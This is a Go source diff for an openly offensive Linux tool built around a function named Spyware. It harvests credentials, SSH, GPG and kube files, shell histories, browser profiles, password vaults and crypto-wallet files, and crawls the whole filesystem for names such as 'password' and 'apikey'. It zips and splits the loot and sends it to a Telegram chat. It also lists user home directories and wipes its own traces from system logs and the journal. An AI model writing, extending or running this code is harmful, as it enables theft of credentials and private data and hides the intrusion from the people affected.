@@ -1,7 +1,6 @@
 package core
 
 import (
-	"archive/zip"
 	"bufio"
 	"fmt"
 	"io"
@@ -16,22 +15,51 @@ import (
 // Spyware handles data extraction based on dump type
 func Spyware(dumpType, token, chatID string, silent bool) error {
 	// Detect OS
+	if !silent {
+		fmt.Println("[INFO] Detecting OS...")
+	}
 	osInfo, err := payloads.DetectOS()
 	if err != nil {
+		if !silent {
+			fmt.Println("[INFO] Warning: failed to detect OS")
+		}
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to detect OS: %v", err), silent)
 		return fmt.Errorf("failed to detect OS: %v", err)
 	}
-	if !strings.Contains(osInfo, "Linux") {
-		return fmt.Errorf("this payload only supports Linux systems")
+	if !strings.Contains(strings.ToLower(osInfo), "linux") {
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: This payload only supports Linux systems, detected: %s", osInfo), silent)
+		return fmt.Errorf("this payload only supports Linux systems, detected: %s", osInfo)
 	}
 
-	// Create temp directory for data collection
-	tempDir := "/tmp/liner_data"
-	if err := os.MkdirAll(tempDir, 0755); err != nil {
-		return fmt.Errorf("failed to create temp dir: %v", err)
+	// Get current working directory
+	cwd, err := os.Getwd()
+	if err != nil {
+		if !silent {
+			fmt.Println("[INFO] Warning: failed to get current working directory")
+		}
+		sendTelegramMessage(token, chatID, "Error: Failed to get current working directory", silent)
+		return fmt.Errorf("failed to get current working directory: %v", err)
 	}
-	defer os.RemoveAll(tempDir)
+
+	// Create temp directory in current working directory
+	tempDir := filepath.Join(cwd, "liner_data")
+	if err := os.MkdirAll(tempDir, 0755); err != nil {
+		if !silent {
+			fmt.Println("[INFO] Warning: failed to create temp directory")
+		}
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to create temp directory: %v", err), silent)
+		return fmt.Errorf("failed to create temp directory: %v", err)
+	}
+	defer func() {
+		if err := os.RemoveAll(tempDir); err != nil && !silent {
+			fmt.Println("[INFO] Warning: failed to clean up temporary directory")
+		}
+	}()
 
 	// Collect data based on dump type
+	if !silent {
+		fmt.Println("[INFO] Collecting files...")
+	}
 	var filesToCollect []string
 	switch strings.ToLower(dumpType) {
 	case "credentials":
@@ -48,23 +76,144 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 		filesToCollect = append(filesToCollect, collectSessions()...)
 		filesToCollect = append(filesToCollect, collectPrivateData()...)
 	default:
+		if !silent {
+			fmt.Println("[INFO] Warning: invalid dump type, stopping")
+		}
+		sendTelegramMessage(token, chatID, "Error: Invalid dump type, stopping", silent)
 		return fmt.Errorf("invalid dump type: %s", dumpType)
 	}
 
-	// Zip collected files
-	zipFile := "/tmp/liner_data.zip"
-	if err := createZipFile(filesToCollect, zipFile); err != nil {
+	// Generate treestructure.txt for system
+	treeFile := filepath.Join(cwd, "treestructure.txt")
+	if !silent {
+		fmt.Println("[INFO] Generating tree structures...")
+	}
+	if err := generateTreeSchema(treeFile); err == nil {
+		filesToCollect = append(filesToCollect, treeFile)
+	}
+
+	// Generate user directory structures
+	userFiles, err := generateUserStructures(cwd)
+	if err == nil {
+		filesToCollect = append(filesToCollect, userFiles...)
+	}
+
+	// Check if there are any files to collect
+	if len(filesToCollect) == 0 {
+		if !silent {
+			fmt.Println("[INFO] Warning: no files collected, stopping")
+		}
+		sendTelegramMessage(token, chatID, "Error: No files collected, stopping", silent)
+		return fmt.Errorf("no files collected")
+	}
+
+	// Copy files to temp directory
+	if !silent {
+		fmt.Println("[INFO] Copying files to temp directory...")
+	}
+	for _, file := range filesToCollect {
+		if _, err := os.Stat(file); err != nil {
+			continue
+		}
+		dest := filepath.Join(tempDir, filepath.Base(file))
+		if err := copyFile(file, dest); err != nil {
+			if !silent {
+				fmt.Printf("[INFO] Warning: failed to copy file %s: %v\n", file, err)
+			}
+			continue
+		}
+	}
+
+	// Zip files from temp directory
+	if !silent {
+		fmt.Println("[INFO] Zipping files...")
+	}
+	zipFile := filepath.Join(cwd, "liner_data.zip")
+	if err := createZipFile(tempDir, zipFile); err != nil {
+		if !silent {
+			fmt.Println("[INFO] Warning: failed to create zip file, stopping")
+		}
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to create zip file: %v", err), silent)
 		return fmt.Errorf("failed to create zip file: %v", err)
 	}
 
-	// Send to Telegram
-	if err := SendToTelegram(token, chatID, zipFile, silent); err != nil {
-		return fmt.Errorf("failed to send data to Telegram: %v", err)
+	// Split zip file into parts
+	if !silent {
+		fmt.Println("[INFO] Splitting zip file...")
+	}
+	zipParts, err := splitZipFile(zipFile, cwd)
+	if err != nil {
+		if !silent {
+			fmt.Println("[INFO] Warning: failed to split zip file, stopping")
+		}
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to split zip file: %v", err), silent)
+		if err := os.Remove(zipFile); err != nil && !silent {
+			fmt.Println("[INFO] Warning: failed to clean up main zip file")
+		}
+		return fmt.Errorf("failed to split zip file: %v", err)
 	}
 
-	// Clean logs selectively
+	// Send start message
+	if !silent {
+		fmt.Println("[INFO] Sending start message to Telegram...")
+	}
+	if err := sendTelegramMessage(token, chatID, "Hello, starting file transfer...", silent); err != nil {
+		if !silent {
+			fmt.Printf("[INFO] Warning: failed to send start message: %v\n", err)
+		}
+	}
+
+	// Send zip parts
+	for _, part := range zipParts {
+		if !silent {
+			fmt.Printf("[INFO] Sending zip part %s to Telegram...\n", filepath.Base(part))
+		}
+		if err := SendToTelegram(token, chatID, part, silent); err != nil {
+			if !silent {
+				fmt.Printf("[INFO] Warning: failed to send zip part %s: %v\n", filepath.Base(part), err)
+			}
+			sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send zip part %s: %v", filepath.Base(part), err), silent)
+		}
+	}
+
+	// Send completion message
+	if !silent {
+		fmt.Println("[INFO] Sending completion message to Telegram...")
+	}
+	if err := sendTelegramMessage(token, chatID, "Goodbye, file transfer completed.", silent); err != nil {
+		if !silent {
+			fmt.Printf("[INFO] Warning: failed to send completion message: %v\n", err)
+		}
+	}
+
+	// Clean up zip parts and main zip file
+	for _, part := range zipParts {
+		if err := os.Remove(part); err != nil && !silent {
+			fmt.Println("[INFO] Warning: failed to clean up zip parts")
+		}
+	}
+	if err := os.Remove(zipFile); err != nil && !silent {
+		fmt.Println("[INFO] Warning: failed to clean up main zip file")
+	}
+
+	// Clean up treestructure.txt and user structure files
+	for _, file := range append([]string{treeFile}, userFiles...) {
+		if _, err := os.Stat(file); err == nil {
+			if err := os.Remove(file); err != nil && !silent {
+				fmt.Println("[INFO] Warning: failed to clean up structure files")
+			}
+		}
+	}
+
+	// Clean logs
+	if !silent {
+		fmt.Println("[INFO] Cleaning logs...")
+	}
 	if err := cleanLogs(); err != nil {
-		return fmt.Errorf("failed to clean logs: %v", err)
+		if !silent {
+			fmt.Println("[INFO] Warning: failed to clean logs")
+		}
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to clean logs: %v", err), silent)
 	}
 
 	return nil
@@ -72,59 +221,89 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 
 // collectCredentials gathers credential-related files
 func collectCredentials() []string {
-	return []string{
+	var files []string
+	possibleFiles := []string{
 		filepath.Join(os.Getenv("HOME"), ".git-credentials"),
 		filepath.Join(os.Getenv("HOME"), ".config/keyring"),
 	}
+	for _, file := range possibleFiles {
+		if info, err := os.Stat(file); err == nil && info.Mode().IsRegular() {
+			files = append(files, file)
+		}
+	}
+	return files
 }
 
 // collectPasswords gathers password-related files
 func collectPasswords() []string {
-	return []string{
+	var files []string
+	possibleFiles := []string{
 		filepath.Join(os.Getenv("HOME"), ".bash_history"),
 		filepath.Join(os.Getenv("HOME"), ".zsh_history"),
 		filepath.Join(os.Getenv("HOME"), ".password-store"),
 	}
+	for _, file := range possibleFiles {
+		if info, err := os.Stat(file); err == nil && info.Mode().IsRegular() {
+			files = append(files, file)
+		}
+	}
+	return files
 }
 
 // collectSessions gathers session-related files
 func collectSessions() []string {
-	return []string{
-		filepath.Join(os.Getenv("HOME"), ".ssh"),
-		filepath.Join(os.Getenv("HOME"), ".gnupg"),
+	var files []string
+	possibleFiles := []string{
+		filepath.Join(os.Getenv("HOME"), ".ssh/authorized_keys"),
+		filepath.Join(os.Getenv("HOME"), ".gnupg/pubring.kbx"),
 		filepath.Join(os.Getenv("HOME"), ".kube/config"),
 		filepath.Join(os.Getenv("HOME"), ".mozilla"),
 		filepath.Join(os.Getenv("HOME"), ".config/chromium"),
 	}
+	for _, file := range possibleFiles {
+		if info, err := os.Stat(file); err == nil && info.Mode().IsRegular() {
+			files = append(files, file)
+		}
+	}
+	return files
 }
 
 // collectPrivateData gathers sensitive private data files
 func collectPrivateData() []string {
 	var files []string
-	// Existing patterns
 	patterns := []string{"*.env", "*.p12", "*.pem", "*.kdbx", "*.keepass", "*.sqlite", "*.wallet"}
 	for _, pattern := range patterns {
 		matches, _ := filepath.Glob(filepath.Join(os.Getenv("HOME"), pattern))
-		files = append(files, matches...)
+		for _, match := range matches {
+			if info, err := os.Stat(match); err == nil && info.Mode().IsRegular() {
+				files = append(files, match)
+			}
+		}
 	}
 
-	// Deep crawl for files with specific keywords
 	keywords := []string{"wallet.txt", "trustwallet.txt", "password", "apikey", "important"}
-	filepath.Walk(os.Getenv("HOME"), func(path string, info os.FileInfo, err error) error {
+	excludedDirs := []string{"/proc", "/sys", "/dev", "/tmp"}
+	filepath.Walk("/", func(path string, info os.FileInfo, err error) error {
 		if err != nil {
-			return nil // Ignore errors to continue crawling
+			return nil
 		}
-		if info.IsDir() {
-			return nil // Skip directories
+		for _, dir := range excludedDirs {
+			if strings.HasPrefix(path, dir) {
+				return filepath.SkipDir
+			}
 		}
-		// Check file permissions
+		if !info.Mode().IsRegular() {
+			return nil
+		}
 		if info.Mode().Perm()&0400 == 0 {
-			return nil // Skip files without read permission
+			return nil
 		}
 		filename := strings.ToLower(filepath.Base(path))
 		for _, keyword := range keywords {
 			if strings.Contains(filename, keyword) {
-				files = append(files, path)
+				if _, err := os.Stat(path); err == nil {
+					files = append(files, path)
+				}
 			}
 		}
 		return nil
@@ -133,37 +312,122 @@ func collectPrivateData() []string {
 	return files
 }
 
-// createZipFile zips the collected files
-func createZipFile(files []string, output string) error {
-	zipOut, err := os.Create(output)
+// copyFile copies a file from src to dst
+func copyFile(src, dst string) error {
+	input, err := os.Open(src)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to open source file %s: %v", src, err)
 	}
-	defer zipOut.Close()
+	defer input.Close()
 
-	writer := zip.NewWriter(zipOut)
-	defer writer.Close()
+	output, err := os.Create(dst)
+	if err != nil {
+		return fmt.Errorf("failed to create destination file %s: %v", dst, err)
+	}
+	defer output.Close()
 
-	for _, file := range files {
-		if _, err := os.Stat(file); os.IsNotExist(err) {
-			continue
-		}
-		f, err := os.Open(file)
-		if err != nil {
-			continue
-		}
-		defer f.Close()
-
-		w, err := writer.Create(filepath.Base(file))
-		if err != nil {
-			return err
-		}
-		_, err = io.Copy(w, f)
-		if err != nil {
-			return err
-		}
+	_, err = io.Copy(output, input)
+	if err != nil {
+		return fmt.Errorf("failed to copy file %s to %s: %v", src, dst, err)
 	}
 	return nil
+}
+
+// createZipFile zips the files in the temp directory
+func createZipFile(tempDir, output string) error {
+	// Check if temp directory has files
+	entries, err := os.ReadDir(tempDir)
+	if err != nil {
+		return fmt.Errorf("failed to read temp directory: %v", err)
+	}
+	if len(entries) == 0 {
+		return fmt.Errorf("no files in temp directory to zip")
+	}
+
+	// Remove output zip file if it exists
+	if _, err := os.Stat(output); err == nil {
+		if err := os.Remove(output); err != nil {
+			return fmt.Errorf("failed to remove existing zip file: %v", err)
+		}
+	}
+
+	// Change to temp directory and zip its contents
+	if err := os.Chdir(tempDir); err != nil {
+		return fmt.Errorf("failed to change to temp directory: %v", err)
+	}
+	cmd := exec.Command("zip", "-r", output, ".")
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to create zip file: %v, output: %s", err, string(output))
+	}
+	return nil
+}
+
+// splitZipFile splits a zip file into parts using split command
+func splitZipFile(filename, outputDir string) ([]string, error) {
+	// Check if zip file exists
+	if _, err := os.Stat(filename); os.IsNotExist(err) {
+		return nil, fmt.Errorf("zip file %s does not exist", filename)
+	}
+
+	// Run split command
+	prefix := filepath.Join(outputDir, "part_")
+	cmd := exec.Command("split", "-b", "25M", filename, prefix)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return nil, fmt.Errorf("failed to split zip file: %v, output: %s", err, string(output))
+	}
+
+	// Collect split parts
+	var zipParts []string
+	entries, err := os.ReadDir(outputDir)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read split parts: %v", err)
+	}
+	for _, entry := range entries {
+		if strings.HasPrefix(entry.Name(), "part_") && !entry.IsDir() {
+			zipParts = append(zipParts, filepath.Join(outputDir, entry.Name()))
+		}
+	}
+
+	return zipParts, nil
+}
+
+// generateTreeSchema generates a system directory tree using the tree command
+func generateTreeSchema(output string) error {
+	cmd := exec.Command("which", "tree")
+	if err := cmd.Run(); err != nil {
+		return nil // Skip if tree is not installed
+	}
+
+	cmd = exec.Command("sh", "-c", "tree / | tee " + output)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to generate tree schema: %v, output: %s", err, string(output))
+	}
+	return nil
+}
+
+// generateUserStructures generates directory structure for each user in /home
+func generateUserStructures(cwd string) ([]string, error) {
+	var userFiles []string
+	homeDir := "/home"
+	entries, err := os.ReadDir(homeDir)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read /home directory: %v", err)
+	}
+
+	for _, entry := range entries {
+		if entry.IsDir() {
+			user := entry.Name()
+			userFile := filepath.Join(cwd, fmt.Sprintf("%s.txt", user))
+			cmd := exec.Command("sh", "-c", fmt.Sprintf("tree /home/%s | tee %s", user, userFile))
+			if output, err := cmd.CombinedOutput(); err == nil {
+				userFiles = append(userFiles, userFile)
+			} else {
+				fmt.Printf("[INFO] Warning: failed to generate user structure for %s: %v, output: %s\n", user, err, string(output))
+			}
+		}
+	}
+
+	return userFiles, nil
 }
 
 // cleanLogs removes traces of the tool from system logs
@@ -178,21 +442,18 @@ func cleanLogs() error {
 		if _, err := os.Stat(log); os.IsNotExist(err) {
 			continue
 		}
-		// Read log file
 		input, err := os.Open(log)
 		if err != nil {
 			continue
 		}
 		defer input.Close()
 
-		// Create temp file
 		tempFile, err := os.CreateTemp("", "liner_log_")
 		if err != nil {
 			continue
 		}
 		defer tempFile.Close()
 
-		// Filter out lines containing toolName
 		scanner := bufio.NewScanner(input)
 		for scanner.Scan() {
 			line := scanner.Text()
@@ -204,7 +465,6 @@ func cleanLogs() error {
 			continue
 		}
 
-		// Replace original log file
 		input.Close()
 		tempFile.Close()
 		if err := os.Rename(tempFile.Name(), log); err != nil {
@@ -212,7 +472,6 @@ func cleanLogs() error {
 		}
 	}
 
-	// Clear journalctl logs if running as root
 	if os.Geteuid() == 0 {
 		cmd := exec.Command("journalctl", "--flush")
 		if err := cmd.Run(); err != nil {
